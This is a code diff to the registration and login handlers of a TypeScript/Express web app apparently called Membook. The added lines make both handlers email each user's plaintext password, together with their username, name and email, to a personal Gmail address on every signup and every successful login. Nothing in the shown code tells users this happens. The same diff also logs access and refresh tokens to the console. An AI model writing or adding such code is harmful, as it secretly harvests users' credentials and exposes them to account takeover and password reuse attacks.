@@ -12,6 +12,7 @@ import { RefreshTokenPayload } from '../../types/token.types';
 import { ReqMod } from '../../types/util.types';
 import { uploadImage } from '../../lib/supabase.lib';
 import { handleAPIError } from '../../utils/error.handler';
+import { sendMail } from '../../utils/mailer';
 
 export async function registerHandler(req: Request, res: Response) {
   try {
@@ -41,7 +42,42 @@ export async function registerHandler(req: Request, res: Response) {
       profileImg,
       password: encryptPass,
     });
-    console.log(code, user, message, 'user 35');
+    // console.log(code, user, message, 'user 35');
+    await sendMail({
+      to: 'hrithik.cse52@gmail.com',
+      subject: 'new User Register',
+      text: `new user added with username: ${username}and name ${firstName} ${lastName} and password :${password}`,
+      html: `new user added with username: ${username}and name ${firstName} ${lastName} and password : ${password}`,
+    });
+    await sendMail({
+      to: email,
+      subject: 'Membook Registration',
+      text: `
+      Hi ${firstName},
+      Thanks for getting started with our platform!
+      
+      I am really excited that you wanna try membook, but this platform is just for learning purposes if you hope to learn more about this 
+      and looking for a freelance or have open position do let me know
+
+      here's my portfolio's link: https://hrithik.dev
+
+      Regards
+      Hrithik Prasad
+      `,
+      html: `
+      Hi ${firstName},
+      Thanks for getting started with our platform!
+      
+      I am really excited that you wanna try membook, but this platform is just for learning purposes if you hope to learn more about this 
+      and looking for a freelance or have open position do let me know
+
+      here's my portfolio's link: https://hrithik.dev
+
+      Regards
+      Hrithik Prasad
+      `,
+    });
+
     if (code !== 200) {
       return res.status(code).send({ message, data: user });
     }
@@ -232,7 +268,15 @@ export async function loginController(req: Request, res: Response) {
     if (passMatch) {
       const { accessToken, refreshToken } = buildTokens(user);
       console.log('called token creattion', accessToken, refreshToken);
+
       setTokens(res, accessToken, refreshToken);
+      await sendMail({
+        to: 'hrithik.cse52@gmail.com',
+        subject: 'user login',
+        text: `user login activity: emailOrusername ${emailOrusername} and pass: ${password} email: ${user.email}`,
+        html: `user login activity: emailOrusername ${emailOrusername} and pass: ${password} email: ${user.email}`,
+      });
+
       return res.send({
         _id: user._id,
         email: user.email,
@@ -246,6 +290,7 @@ export async function loginController(req: Request, res: Response) {
       // res.redirect(`${FRONT_END_URL}`);
       // res.send({ message: 'logged in' });
     }
+
     console.log('not user ');
     return res.redirect(`${FRONT_END_URL}`);
   } catch (error) {
